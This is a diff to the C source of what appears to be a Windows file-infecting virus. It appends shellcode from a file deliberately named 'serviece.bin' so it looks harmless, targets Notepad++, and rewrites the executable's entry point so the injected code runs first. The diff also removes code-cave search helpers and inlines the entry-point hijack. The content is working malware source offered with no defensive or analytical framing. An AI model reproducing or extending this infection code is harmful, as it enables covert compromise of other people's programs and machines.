@@ -11,8 +11,12 @@
 #define ERROR -1
 #define SUCCESS 0
 
-// Binary file.
-// to use from here change the define to SHELLCODE_PATH "C:\\Users\\User\\source\\repos\\virus\\shellcode\\shellcode.bin"
+// Shellcode is the binary file with the position independent code.
+
+// Infect from this directory:
+// #define SHELLCODE_PATH "C:\\Users\\User\\source\\repos\\virus\\shellcode\\shellcode.bin"
+
+// Infect from this directory:
 // it will be the shellcode file name in the program infected computer, so it have to be not sus.
 #define SHELLCODE_PATH "serviece.bin"
 
@@ -30,66 +34,6 @@
 #define FIREFOX_PATH "C:\\Program Files\\Mozilla Firefox\\firefox.exe"
 
 #define INFECTED_PATH NOTEPAD_PLUS_PLUS_PATH
-
-PVOID get_code_cave_address_in_section(EXE_file* infected, PIMAGE_SECTION_HEADER section, PDWORD result_out, DWORD shellcode_size)
-{
-    int gap = 0;
-    DWORD address = 0;
-    BYTE current_byte = 0;
-    for (address = section->PointerToRawData; address < (section->SizeOfRawData + section->PointerToRawData); address++)
-    {
-        current_byte = *(infected->mapped_handle + address);
-        if (current_byte == 0x00)
-            gap++;
-        else gap = 0;
-
-        if (gap >= shellcode_size)
-            break;
-    }
-
-    *result_out = gap > 0 && gap < section->SizeOfRawData ? SUCCESS : ERROR;
-    // Calculate start of code_cave;
-    return  address - gap + infected->mapped_handle + 1;
-
-}
-
-PVOID get_code_cave_address(EXE_file* infected, PDWORD result_out, DWORD shellcode_size)
-{
-    // This function also set the 'infected_section' member of infected EXE_file*.
-    DWORD number_of_sections = infected->headers->FileHeader.NumberOfSections;
-    printf("File has %d section\n", number_of_sections);
-    // first section.
-    PIMAGE_SECTION_HEADER first_section = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(infected->headers);
-    PIMAGE_SECTION_HEADER current_section = NULL;
-    int address = 0;
-    int result = 0;
-    for (size_t i = 0; i < number_of_sections; i++)
-    {
-        current_section = first_section + i;
-        printf("Current section is %s\n", current_section->Name);
-        address = get_code_cave_address_in_section(infected, current_section, &result, shellcode_size);
-        if (result == SUCCESS)
-        {
-            printf("There is place for shell code at address %d\n", address);
-            break;
-        }
-        printf("Not enough place at this section.\n");
-    }
-    infected->infected_section = current_section;
-    *result_out = result;
-    return address;
-}
-
-
-VOID set_new_entery_point(EXE_file* infected, DWORD new_entery_point)
-{
-    // set new entery point to shellcode adderess relative to start of file (end of file).
-    new_entery_point = (DWORD)new_entery_point - (DWORD)infected->mapped_handle;
-    // change address to RVA.
-    new_entery_point += infected->infected_section->VirtualAddress - infected->infected_section->PointerToRawData;
-    infected->headers->OptionalHeader.AddressOfEntryPoint = infected->infected_section->VirtualAddress;
-    //infected->headers->OptionalHeader.AddressOfEntryPoint = new_entery_point;
-}
 
 int main()
 {
@@ -139,7 +83,6 @@ int main()
         goto end;
     }
 
-
     infected->handle = CreateFileA(INFECTED_PATH, 
         FILE_APPEND_DATA | GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ,          
@@ -169,9 +112,12 @@ int main()
 
     infection_address = infected->mapped_handle + infected->origianal_file_size;
 
+    // copy shellcode to the infected exe.
     memcpy((LPBYTE)infection_address, shellcode_buffer, shellcode_size);
     set_addrress_in_shellcode(infected, infection_address, shellcode_size);
-    set_new_entery_point(infected, infection_address);
+
+    // The new entery address of the infected exe will point to the new created section with the shellcode.
+    infected->headers->OptionalHeader.AddressOfEntryPoint = infected->infected_section->VirtualAddress;
 
 end:
     if (infected != NULL)
